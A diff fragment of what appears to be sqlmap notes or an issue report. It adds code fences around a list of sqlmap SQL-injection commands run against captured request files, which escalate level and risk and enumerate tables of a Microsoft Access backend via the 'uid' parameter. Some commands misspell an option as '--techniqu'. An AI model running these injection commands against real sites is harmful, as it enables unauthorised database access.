@@ -20,7 +20,7 @@ Connection: close
 __VIEWSTATE=%2FwEPDwUKMTYzNDg3OTA4NmRk&after=&before=1*
 
 ```
-
+```
 ./sqlmap.py -r session.txt --banner
 ./sqlmap.py -r session.txt --banner --technique=U
 ./sqlmap.py -r session.txt --banner --technique=U --level 3 --risk 3
@@ -34,3 +34,4 @@ __VIEWSTATE=%2FwEPDwUKMTYzNDg3OTA4NmRk&after=&before=1*
 ./sqlmap.py -r session2.txt --tables --level 3 --risk 3  --dbms "Microsoft Access" --code=302
 ./sqlmap.py -r session2.txt --tables --level 3 --risk 3  --dbms "Microsoft Access" --code=302 --techniqu=B
 ./sqlmap.py -r session2.txt --tables --level 3 --risk 3  --dbms "Microsoft Access" --code=302 --techniqu=B -p uid
+```
